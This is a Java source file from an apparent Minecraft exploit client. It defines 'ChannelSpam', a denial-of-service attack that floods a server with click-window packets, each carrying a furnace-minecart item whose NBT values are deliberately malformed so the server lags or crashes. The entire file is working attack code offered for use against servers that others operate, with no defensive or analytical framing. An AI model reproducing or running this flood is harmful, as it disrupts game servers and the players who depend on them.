package dev.isnow.puppy.exploit.impl.flood;

import dev.isnow.puppy.exception.ExploitException;
import dev.isnow.puppy.exploit.Exploit;
import dev.isnow.puppy.exploit.ExploitInfo;
import dev.isnow.puppy.exploit.ExploitType;
import dev.isnow.puppy.exploit.argument.Argument;
import dev.isnow.puppy.helper.ChatHelper;
import dev.isnow.puppy.helper.NetHelper;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.C0EPacketClickWindow;

/**
 * @author 5170
 * made on dev.isnow.puppy.exploit.impl.flood
 */

@ExploitInfo(
        name = "ChannelSpam",
        type = ExploitType.FLOOD,
        description = "Simple channel crasher that can provide lags on small servers"
)
public class ChannelExploit extends Exploit {

    public ChannelExploit() {
        super(new Argument("packets", 0, Integer.class));
    }

    @Override
    public void execute(Object... args) throws ExploitException {
        long start = System.currentTimeMillis();
        int packets = (int) args[0];

        ChatHelper.printMessage(
                String.format("Sending &8[&7Method: &7%s&7, Packets: &7%s&8]", getName(), args[0]));
        ItemStack itemStack = new ItemStack(Items.furnace_minecart);
        NBTTagCompound compound = new NBTTagCompound();

        compound.setDouble("PushX", Double.MAX_VALUE + 5);
        compound.setDouble("PushZ", Double.MAX_VALUE + 5);
        compound.setShort("Fuel", Short.MIN_VALUE);

        itemStack.setTagCompound(compound);
        for (int i = 0; i < packets; i++) {
            NetHelper.sendPacket(new C0EPacketClickWindow(5, 5, 5 , 0, itemStack, (short) 5));
        }
        ChatHelper.printMessage(String.format("Sent &8[&7Method: &7%s&7, Time: &7%sms&8]", getName(),
                System.currentTimeMillis() - start));
    }
}
